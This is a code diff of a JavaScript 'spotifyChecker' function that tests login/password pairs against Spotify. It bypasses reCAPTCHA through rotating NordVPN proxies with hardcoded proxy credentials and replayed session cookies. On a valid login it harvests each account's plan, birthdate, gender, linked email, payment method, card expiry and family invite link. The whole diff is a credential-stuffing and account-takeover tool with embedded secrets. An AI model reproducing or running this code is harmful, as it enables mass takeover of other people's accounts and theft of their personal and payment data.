@@ -1,85 +1,176 @@
-let spotifyChecker = async (login, password, page) => {
-        await page.goto("https://www.spotify.com/us/logout/");
-        await page.goto("https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect");
-        await page.evaluate(() => document.querySelector("#login-username").value = "");
-        await page.type('#login-username', login);
-        await page.type('#login-password', password);
-        await page.click('#login-button');
-        // await page.waitFor(5000);
-        var subType = true;
-
-        try{
-            //await page.goto("https://www.spotify.com/us/api/account/overview/");
-            await page.waitForSelector("#profileMenu",{timeout:1500});
-        }catch {
-            subType = false;
+let spotifyChecker = async (account)=>{
+    var checkResult = {
+        validAccount: false,
+        accountLogin: {
+            email: account.login,
+            password: account.password
         }
-
-        if(page.url() === "https://accounts.spotify.com/login/?_locale=en-US&continue=https%3A//www.spotify.com/us/api/account/overview/" || page.url() === "https://accounts.spotify.com/en/login/?_locale=en-US&continue=https:%2F%2Fwww.spotify.com%2Fus%2Fapi%2Faccount%2Foverview%2F")
-            subType = false;
-
-        var checkResult = {
-            validAccount: subType,
-            accountLogin: {
-                email: login,
-                password: password
-            },
-            accountInfo:null
-        };
-
-        if(subType){
-            // await page.goto("https://www.spotify.com/us/api/account/overview/");
-            var innerText = await page.evaluate(() =>  {
-                return fetch('https://www.spotify.com/us/api/account/overview/',{
-                    method:"GET"
-                }).then(res=>res.json()).then(res=>res)
-            });
-            // await page.goto("https://www.spotify.com/us/api/account/datalayer/");
-            var datalayer = await page.evaluate(() =>  {
-                return fetch('https://www.spotify.com/us/api/account/datalayer/',{
-                    method:"GET"
-                }).then(res=>res.json()).then(res=>res)
-            });
-            // await page.goto("https://www.spotify.com/api/account-settings/v1/profile/");
-            var theProfile = await page.evaluate(() =>  {
-                return fetch('https://www.spotify.com/api/account-settings/v1/profile/',{
-                    method:"GET"
-                }).then(res=>res.json()).then(res=>res)
-            });
-            // await page.goto("https://www.spotify.com/us/home-hub/api/v1/family/home/");
-            var memberArea = await page.evaluate(() =>  {
-                return fetch('https://www.spotify.com/us/home-hub/api/v1/family/home/',{
-                    method:"GET"
-                }).then(res=>res.json()).then(res=>res)
-            });
-
-            checkResult.accountInfo = {
-                plan : innerText.props.plan.plan.name,
-                username:theProfile.profile.username,
-                gender:theProfile.profile.gender,
-                birthdate:theProfile.profile.birthdate,
-                third_party_email:theProfile.profile.third_party_email,
-                country:innerText.props.profile.fields[innerText.props.profile.fields.length-1].value,
-                accountDayAge: datalayer.accountAgeDays,
-                isTrialUser:datalayer.isTrialUser,
-                paymentInfo: null,
-                members : null
-            };
-            if(datalayer.isSubAccount || datalayer.currentPlan === "free"){
-                checkResult.accountInfo.paymentInfo = null;
-                if(datalayer.isSubAccount)
-                    checkResult.accountInfo.plan += ' | member';
-            }else if(!datalayer.isSubAccount || !datalayer.isTrialUser){
-                checkResult.accountInfo.plan += ' | owner';
-
-                checkResult.accountInfo.paymentInfo = {
-                    price : innerText.props.plan.paymentInfo.billingInfo.split(">")[1].split("<")[0],
-                    nextBill:innerText.props.plan.paymentInfo.billingInfo.split(">")[3].split("<")[0],
-                    expires:innerText.props.plan.paymentInfo.paymentMethod.expiry,
-                    paymentMethod:innerText.props.plan.paymentInfo.paymentMethod.name
-                }
+    };
+    const httpsAgent = new HttpsProxyAgent( "AzYYbtGgo3UX64DyoZBXGMKf:QHu2RWpVyFNR6ioTcGuPQWv4@amsterdam.nl.socks.nordhold.net:443");
+    const captchaToken = await axios.get(RecaptchaUrl,{
+        proxy:{
+            host:"uk1930.nordvpn.com",
+            port: "1080",
+            auth:{
+                username:"AzYYbtGgo3UX64DyoZBXGMKf",
+                password:"QHu2RWpVyFNR6ioTcGuPQWv4"
             }
-            if(memberArea.planType === "family" && memberArea.code !== "NOT_FOUND") {
+        }
+    }).then(res=>{
+        const $ =  cheerio.load(res.data);
+        console.log($('#recaptcha-token').attr('value'));
+        return $('#recaptcha-token').attr('value');
+    });
+    var data = new FormData();
+    data.append('v', 'iSHzt4kCrNgSxGUYDFqaZAL9');
+    data.append('vh', '13599012192');
+    data.append('size', 'invisible');
+    data.append('reason', 'q');
+    data.append('k', '6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39');
+    data.append('hl', 'en');
+    data.append('co', 'aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.');
+    data.append('chr', '%5B89%2C64%2C27%5D');
+    data.append('bg', '!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ');
+    data.append('c', captchaToken);
+    var configRes = {
+        method: 'post',
+        url: 'https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39',
+        headers: {
+            'Cookie': 'NID=204=GtnsbLOrRlTN_GWJfFAZwLY7lmbdV1t5FIvYbe03bv7t0ovJrXAg617GqhDnyW36fN5zam8SEk-YNsPmLWOfURR59J4unSaZCdp2du5EiAJIAt48ICgoP7IJqNtXXfLGVyoxvOD89HoPvBNxuZUCLayrh2ajIhDtIDJGqCb2MMw',
+            ...data.getHeaders()
+        },
+        data : data
+    };
+    const cookies = await axios.get("https://accounts.spotify.com/id-ID/login").then(axiosResponse => axiosResponse.headers["set-cookie"]);
+    const ress = await axios(configRes)
+        .then(axiosResponse=>{
+            return axiosResponse.data.split('rresp')[1].split(',null')[0].replace('\"','').replace(',','').replace(/\"/g,"");
+        })
+        .catch(err => console.log(err));
+
+    var dataLogin = qs.stringify({
+        'username': account.login,
+        'password': account.password,
+        'remember': 'false',
+        'csrf_token': cookies[2].split(";")[0].replace("csrf_token=",''),
+        'recaptchaToken':ress
+    });
+    var configLogin = {
+        method: 'post',
+        url: 'https://accounts.spotify.com/login/password',
+        headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
+            'Origin': 'https://accounts.spotify.com',
+            'Referer': 'https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Cookie': 'sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; spot=%7B%22t%22%3A1605136046%2C%22m%22%3A%22fr%22%2C%22p%22%3Anull%7D; sp_t=e262c788-69d5-4bcb-9d8d-f377ebb693f7; sp_new=1; justRegistered=null; __tdev=QHMTxssj; __tvis=qx4MC7SP; _gat=1; remember=accce@aol.com; '+cookies[0].split(";")[0].replace("",'')+';'+cookies[1].split(";")[0].replace("",'')+'; __bon=MHwwfC0zNDkzNzM1NDN8LTE0NjczNjg4ODA2fDF8MXwxfDE=; sp_ac=AQDEi4nePTwXpURm2eD6s161CJFK-rIddW-AqmkUAaptluHcSHcsA-T_SVGlKJ2291EdYM_dxF4iXUqf06Es4wVyb_ytxivQLjGca9dWaHjiAtGDngSNe0EKDFDxTVubiuqcMU9soUyVuYqHNSvMtIIltKUnLAVzhAVoXFL4HRhYVxtKr6sKyJsBgFJdEn3LQ3VSKTu8_ck9ylp6EY-HcMXKQ58IjygSsAI; sp_dc=AQArKogjDcGCIdeHBArxmqHFB2wTdyy2nVaKTdV5VWLEGzVn7mq1lYWjw0VdPnPnCrHpRPauTUlwFNVH26HmbfHoBOSBMGutt5DmRArRNg; csrf_token='+cookies[2].split(";")[0].replace("csrf_token=",'')+'; sp_key=4f4420ef-b662-4bc8-aad7-214ac52839c1'
+        },
+        data : dataLogin
+    };
+    return await axios(configLogin)
+        .then(async function (response) {
+            var loginCookie= response.headers["set-cookie"];
+            var configOverview = {
+                method: 'get',
+                withCredentials: true,
+                url: 'https://www.spotify.com/us/api/account/overview/',
+                headers: {
+                    // 'Cookie': 'sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; sp_t=e262c788-69d5-4bcb-9d8d-f377ebb693f7; sp_dc=AQArKogjDcGCIdeHBArxmqHFB2wTdyy2nVaKTdV5VWLEGzVn7mq1lYWjw0VdPnPnCrHpRPauTUlwFNVH26HmbfHoBOSBMGutt5DmRArRNg; sp_key=4f4420ef-b662-4bc8-aad7-214ac52839c1; spsess=es20S-Lcyzzn%2CxY503kecHU4XmzRGLGTyXvwOm1mTyiuimK6; sp_usid=85b0ddbf-df13-480c-b19c-19f1ea186b53; sp_phash=42910c21d48dd656a97d17d1da9bc62426e4d49e; sp_gaid=0088fc4fc9b22f66826dd99fc8ba9afac867440b814d4497c78376; sp_m=us; spot=%7B%22t%22%3A1605136046%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D; wceuc=ATCDyz8gPnQsfr8sZjjA0Dlf8AyIkbLzGnPlsCysn1U6cey2s0hr996vd6mzYhMoplp/VIjWp5BD3nMFjfn8QzucbVv1nJj7o9w+LUBLX/myMgPk2CqXUJFZ/YHmr3JAvBsyWsaPK6w8BwdC4Gq56mRS6y6V1D6ck67bf++qrqgbnHlX2Vtc/kSrgp6fw0wAYJb4m3kXHKrfOBNdTrUubAmoKB1A52SbcCzhI3MH9BYFtIPitco0njv15vVBNQNHbuofztd2+Zk7uOemAXGG5eRjAVL+Ps/QmKodOHGXMqwLRi+rvn1vuSK6ifj0WzkCp16E11acT7881ZEREtkTJ7VPuI60QpO/2NL+sGzxZtWdh4xEapab5gOhhIKoqb2ok8Zf0CXS09JN9HjgBbEblCqs6FF++fyX+uSCAzBl2PlNjQATpFN+48KYUHetSnsdzwzBbckL; sp_landing=https%3A%2F%2Fwww.spotify.com%2Fus%2Fapi%2Faccount%2Foverview%2F'
+                    'Cookie' :loginCookie.map(e => e.split(';')[0]).join(';')
+                }
+            };
+            const innerText = await axios(configOverview)
+                .then(function (response) {
+                    return response.data;
+                })
+                .catch(function (error) {
+                    console.log(error);
+                });
+            configOverview.url = "https://www.spotify.com/us/api/account/datalayer/";
+            const datalayer = await axios(configOverview)
+                .then(function (response) {
+                    return response.data;
+                })
+                .catch(function (error) {
+                    console.log(error);
+                });
+            configOverview.url = "https://www.spotify.com/us/home-hub/api/v1/family/home/";
+            const memberArea = await axios(configOverview)
+                .then(function (response) {
+                    return response.data;
+                })
+                .catch(function (error) {
+                    return { code: 'NOT_FOUND', detail: 'Home not found.' }
+                });
+            configOverview.url = "https://www.spotify.com/api/account-settings/v1/profile/";
+            const theProfile =  await axios(configOverview)
+                .then(function (response) {
+                    return response.data;
+                })
+                .catch(function (error) {
+                    // console.log(error);
+                    return {profile:{username:null,gender:null,birthdate:null,third_party_email:null}}
+                });
+
+
+            checkResult.validAccount = true;
+            checkResult.accountInfo = {
+                plan: innerText.props.plan.plan.name,
+                username: theProfile.profile.username ,
+                gender: theProfile.profile.gender,
+                birthdate: theProfile.profile.birthdate,
+                third_party_email: theProfile.profile.third_party_email,
+                country: innerText.props.profile.fields[innerText.props.profile.fields.length - 1].value,
+                accountDayAge: datalayer.accountAgeDays,
+                isTrialUser: datalayer.isTrialUser,
+                paymentInfo: null,
+                members: null
+            };
+            if (datalayer.isSubAccount || datalayer.currentPlan === "free") {
+                checkResult.accountInfo.paymentInfo = null;
+                if (datalayer.isSubAccount)
+                    checkResult.accountInfo.plan += ' | member';
+            } else if (!datalayer.isSubAccount || !datalayer.isTrialUser) {
+                checkResult.accountInfo.plan += ' | owner';
+                console.log("overline === "+innerText.props.plan.plan.overline);
+                if(!innerText.props.plan.plan.overline){
+                    if(innerText.props.plan.paymentInfo.billingInfo && !innerText.props.plan.paymentInfo.note){
+                        checkResult.accountInfo.paymentInfo = {
+                            price: innerText.props.plan.paymentInfo.billingInfo.split(">")[1].split("<")[0],
+                            nextBill: innerText.props.plan.paymentInfo.billingInfo.split(">")[3].split("<")[0],
+                            expires: innerText.props.plan.paymentInfo.paymentMethod.expiry,
+                            paymentMethod: innerText.props.plan.paymentInfo.paymentMethod.name
+                        }
+                    }else{
+                        checkResult.accountInfo.paymentInfo = {
+                            price: null,
+                            nextBill: innerText.props.plan.paymentInfo.note.split('>')[1].replace('</b',''),
+                            expires: null,
+                            paymentMethod: null
+                        }
+                    }
+                }else{
+                    console.log("note"+innerText.props.plan.paymentInfo.note);
+                    var note = innerText.props.plan.paymentInfo.note;
+                    if(!note)
+                        note = innerText.props.plan.paymentInfo.billingInfo;
+                    checkResult.accountInfo.paymentInfo = {
+                        price: null,
+                        nextBill: note.split('>')[1].replace('</b',""),
+                        expires: null,
+                        paymentMethod: null
+                    };
+                    checkResult.accountInfo.plan += " | " + innerText.props.plan.plan.overline
+                }
+
+            }
+            if (memberArea.planType === "family" && memberArea.code !== "NOT_FOUND") {
                 checkResult.accountInfo.members = [];
                 if (memberArea.inviteToken) {
                     checkResult.accountInfo.inviteToken = "https://www.spotify.com/us/family/join/invite/" + memberArea.inviteToken;
@@ -94,10 +185,11 @@ let spotifyChecker = async (login, password, page) => {
                     })
                 }
             }
-        }
-        console.log(checkResult);
-        await page.goto("https://www.spotify.com/us/logout/");
-        return  checkResult
+            return checkResult;
+        })
+        .catch(function (error) {
+            return checkResult;
+        });
 
 };
 
